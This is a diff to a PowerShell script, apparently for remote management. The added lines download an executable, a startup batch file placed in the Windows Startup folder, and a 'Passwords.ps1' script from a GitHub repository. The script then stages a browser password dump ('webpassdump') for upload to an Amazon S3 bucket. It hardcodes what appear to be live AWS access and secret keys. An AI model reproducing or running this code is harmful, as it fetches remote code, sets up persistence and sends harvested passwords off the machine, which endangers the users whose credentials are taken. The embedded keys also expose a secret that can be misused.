@@ -44,7 +44,39 @@ if (Test-Path -path $software) {
 
 Invoke-WebRequest -Uri "https://github.com/DemonicDorx/temp/blob/main/RCTBrowserView.exe" -Outfile 'C:\Windows\Temp\JuansFamousFriedChicken\RCTBrowserView.exe'
 
+"Software copied"
+
+}
+
+$Software2='C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\startup.bat'
+
+"Test to see if software exists"
+
+if (Test-Path -path $software2) {
+
+"Software Exists"
+
+} Else {
+
+# Copy Zip to local machine
+
 Invoke-WebRequest -Uri 'https://github.com/DemonicDorx/temp/blob/main/startup.bat' -Outfile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\startup.bat'
+
+"Software copied"
+
+}
+
+$Software3='C:\Windows\Temp\JuansFamousFriedChicken\Passwords.ps1'
+
+"Test to see if software exists"
+
+if (Test-Path -path $software3) {
+
+"Software Exists"
+
+} Else {
+
+# Copy Zip to local machine
 
 Invoke-WebRequest -Uri "https://github.com/DemonicDorx/temp/blob/main/Passwords.ps1" -Outfile 'C:\Windows\Temp\JuansFamousFriedChicken\Passwords.ps1'
 
@@ -67,10 +99,15 @@ $File = $hostname + "-" + $user
 
 REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\ITA /v Custom2 /t REG_SZ /d "https://rmmoutputs.s3.amazonaws.com/webpassdump/$File.html" /f
 
+timeout 10
+
 Remove-Item -Path C:\Windows\Temp\JuansFamousFriedChicken\$File.html -Force
 Rename-Item -Path "C:\Windows\Temp\JuansFamousFriedChicken\password" -NewName "$File.html"
 #Importing AWS Powershell Module to current sesssion
 Import-Module -Name AWS.Tools.S3
+
+timeout 5
+
 #Setup Credential for cloud storage AWS S3
 Set-AWSCredential -AccessKey AKIAV6ZQELF5ADIC4QXW -SecretKey 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 -StoreAs default
 Get-S3Bucket  -BucketName rmmoutputs
